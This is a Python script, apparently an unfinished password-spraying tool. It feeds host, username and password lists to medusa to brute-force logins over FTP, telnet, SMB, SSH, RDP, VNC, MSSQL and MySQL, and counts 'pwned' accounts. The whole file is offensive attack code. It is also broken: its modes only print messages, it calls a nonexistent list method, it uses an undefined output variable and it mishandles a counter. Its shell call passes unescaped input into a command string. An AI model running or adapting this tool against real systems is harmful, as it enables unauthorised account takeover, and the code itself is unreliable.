#!/usr/bin/env python3

import argparse
import concurrent.futures
import threading
import csv
import os

from colorama import Fore
from colorama import Style

parser = argparse.ArgumentParser()
parser.add_argument('-x', help='Nmap file to scan for inputs')
parser.add_argument('-iL', help='Take pre-permutations as input (must be generated with -g)')
parser.add_argument('-H', help='Hosts to spray against.')
parser.add_argument('-U', help='Username file spray (username per newline)')
parser.add_argument('-P', help='Password file spray (username per newline)')
parser.add_argument('--protocols', choices=['ftp', 'telnet', 'smb', 'ssh', 'rdp', 'vnc', 'mssql', 'mysql'], help='Protocols to spray')
parser.add_argument('--generate', help='Only generate permutations')
parser.add_argument('--threads', default=25, help='Threads to spray')
parser.add_argument('-o', default='gorgo.log', help='Output filename')
parser.add_argument('--run', help='Run spray')
parser.add_argument('--random', help='Randomize target list')
args = parser.parse_args()

thread_local = threading.local()
threads = 25
pwned = 0

def auth_attempt(attempt):
    ip = attempt["ip"]
    username = attempt["username"]
    password = attempt["password"]
    service = attempt["service"]
    port = attempt["port"]

    output = os.popen(f'medusa -b -h {ip} -u "{username}" -p "{password}" -M "{service}" -n "{port}" 2>&1').read()
    with open(outfile, 'a', 1) as f:
        f.write(output + os.linesep)

    print(f"[{Fore.GREEN}INF{Style.RESET_ALL}] {Fore.BLUE}Trying: {service}://{username}:{password}@{ip}:{port}{Style.RESET_ALL}")
    if "[SUCCESS]" in output:
        print(f'{Fore.GREEN}AUTHENTICATION SUCCESSFUL! {Fore.YELLOW}{service}://{username}:{password}@{ip}:{port}{Style.RESET_ALL}')
        print(f'{Fore.GREEN}{output}{Style.RESET_ALL}')
        pwned += 1
    else:   
        print(f'{Fore.BLUE}{output}{Style.RESET_ALL}')
def bulk_attempts(attempts):
    print(f'{Fore.BLUE}Starting password spray against {len(attempts)} total hosts using {threads} threads...{Style.RESET_ALL}')
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        executor.map(auth_attempt, attempts)

    print(f'{Fore.GREEN}Spray complete against {len(attempts)} total hosts!{Style.RESET_ALL}')
    print(f'{Fore.RED}Discovered {pwned} user accounts!{Style.RESET_ALL}')
def parse_row(row):
    ip = row[0]
    username = row[1]
    password = row[2]
    service = row[3]
    port = row[4]

    return {'ip':ip, 'username':username, 'password':password, 'service':service, 'port':port}
def input_csv(filename):
    with open(filename, newline="") as csvfile:
        reader = csv.reader(csvfile, delimiter=',', quotechar='"') 
        attempts = []

        for row in reader:
            attempts.push(parse_row(row))

        bulk_attempts(attempts)

if args.x:
    print("Doing nmap mode!")
elif args.iL:
    print("Taking permutations as input...")
elif args.H and args.U and args.P and args.protocols:
    if args.run:
        print("Going on-the-go mode running..")
    elif args.generate:
        print('Just generating the output...')
else:
    parser.print_help()



